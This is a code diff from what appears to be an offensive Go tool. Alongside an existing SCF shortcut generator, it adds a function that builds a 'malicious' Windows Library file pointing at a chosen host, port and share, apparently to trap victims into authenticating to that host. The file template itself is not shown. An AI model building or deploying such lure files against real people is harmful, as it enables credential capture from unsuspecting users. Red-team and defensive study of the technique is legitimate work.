@@ -124,3 +124,31 @@ func CreateSCF(target string, output string, port string) {
 
 	fmt.Printf("[+] SCF shortcut successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), SCFCreationDuration)
 }
+
+// CreateLIB function
+func CreateLIB(target string, output string, port string, share string) {
+	fmt.Printf("[+] Preparing your malicious Library file...\n\n")
+
+	// Set the target path
+	target = target + "@" + port
+
+	// Record the start time
+	LIBCreationStartTime := time.Now()
+
+	// Get the Library file template with provided values
+	libraryFileContent := Templates.GetLibraryFileTemplate(target, share)
+
+	// Record the end time
+	LIBCreationEndTime := time.Now()
+
+	// Call function named GetAbsolutePath
+	outputAbsolute := Utils.GetAbsolutePath(output)
+
+	// Calculate the duration
+	LIBCreationDuration := LIBCreationEndTime.Sub(LIBCreationStartTime)
+
+	// Call function named WriteToFile
+	Output.WriteToFile(output, libraryFileContent)
+
+	fmt.Printf("[+] Library file successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), LIBCreationDuration)
+}
